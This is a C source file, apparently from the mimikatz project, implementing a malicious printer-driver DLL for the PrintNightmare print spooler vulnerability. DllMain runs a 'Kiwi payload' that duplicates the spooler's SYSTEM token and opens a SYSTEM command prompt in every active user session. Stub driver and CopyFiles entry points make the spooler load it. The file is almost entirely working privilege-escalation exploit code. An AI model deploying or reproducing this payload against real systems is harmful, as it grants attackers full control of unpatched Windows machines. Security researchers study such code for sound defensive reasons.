/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimispool.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	UNREFERENCED_PARAMETER(hinstDLL);
	UNREFERENCED_PARAMETER(lpReserved);

	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		RunProcessForAll(L"cmd.exe");
	}

	return TRUE;
}

// PrintNightMare 2.x - via config file and/or "real driver"
VOID APIENTRY DrvResetConfigCache()
{
	;
}

BOOL APIENTRY DrvQueryDriverInfo(DWORD dwMode, PVOID pBuffer, DWORD cbBuf, PDWORD pcbNeeded)
{
	BOOL status = FALSE;

	if (dwMode == DRVQUERY_USERMODE)
	{
		*pcbNeeded = sizeof(DWORD);
		if (pBuffer && (cbBuf >= sizeof(DWORD)))
		{
			status = TRUE;
			*(DWORD*)pBuffer = TRUE;
		}
		SetLastError(ERROR_INSUFFICIENT_BUFFER);
	}
	else
	{
		SetLastError(ERROR_INVALID_PARAMETER);
	}

	return status;
}

BOOL APIENTRY DrvEnableDriver(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded)
{
	BOOL status = FALSE;

	if ((iEngineVersion < 0x20000) || (cj < 0x10))
	{
		SetLastError(ERROR_BAD_DRIVER_LEVEL);
	}
	else
	{
		pded->iDriverVersion = 0x20000;
		pded->pdrvfn = NULL;
		pded->c = 0;
		status = TRUE;
	}

	return status;
}

VOID APIENTRY DrvDisableDriver()
{
	;
}

// PrintNightMare 3.x - via "real packaged driver" - NOT included (need WHQL signature - or pre-approved Authenticode)

// PrintNightMare 4.x - via CopyFiles
DWORD WINAPI GenerateCopyFilePaths(LPCWSTR pszPrinterName, LPCWSTR pszDirectory, LPBYTE pSplClientInfo, DWORD dwLevel, LPWSTR pszSourceDir, LPDWORD pcchSourceDirSize, LPWSTR pszTargetDir, LPDWORD pcchTargetDirSize, DWORD dwFlags)
{
	UNREFERENCED_PARAMETER(pszPrinterName);
	UNREFERENCED_PARAMETER(pszDirectory);
	UNREFERENCED_PARAMETER(pSplClientInfo);
	UNREFERENCED_PARAMETER(dwLevel);
	UNREFERENCED_PARAMETER(pszSourceDir);
	UNREFERENCED_PARAMETER(pcchSourceDirSize);
	UNREFERENCED_PARAMETER(pszTargetDir);
	UNREFERENCED_PARAMETER(pcchTargetDirSize);
	UNREFERENCED_PARAMETER(dwFlags);
	
	return ERROR_SUCCESS;
}

BOOL WINAPI SpoolerCopyFileEvent(LPWSTR pszPrinterName, LPWSTR pszKey, DWORD dwCopyFileEvent)
{
	UNREFERENCED_PARAMETER(pszPrinterName);
	UNREFERENCED_PARAMETER(pszKey);
	UNREFERENCED_PARAMETER(dwCopyFileEvent);
	
	return TRUE;
}

// Kiwi payload - SYSTEM on all active desktop(s)
BOOL RunProcessForAll(LPWSTR szProcess)
{
	BOOL status = FALSE;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	HANDLE hToken, hNewToken;
	DWORD i, count;
	LPVOID Environment;
	PSESSIONIDW sessions;

	si.cb = sizeof(si);
	si.lpDesktop = L"winsta0\\default";

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hNewToken))
		{
			if (CreateEnvironmentBlock(&Environment, hNewToken, FALSE))
			{
				if (WinStationEnumerateW(SERVERHANDLE_CURRENT, &sessions, &count)) // cmd as SYSTEM for everyone
				{
					for (i = 0; i < count; i++)
					{
						if (sessions[i].State == State_Active)
						{
							if (SetTokenInformation(hNewToken, TokenSessionId, &sessions[i].SessionId, sizeof(sessions[i].SessionId)))
							{
								if (CreateProcessAsUser(hNewToken, szProcess, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, Environment, NULL, &si, &pi))
								{
									CloseHandle(pi.hThread);
									CloseHandle(pi.hProcess);
								}
							}
						}
					}
					if (sessions)
					{
						WinStationFreeMemory(sessions);
					}
				}
				DestroyEnvironmentBlock(Environment);
			}
			CloseHandle(hNewToken);
		}
		CloseHandle(hToken);
	}

	return status;
}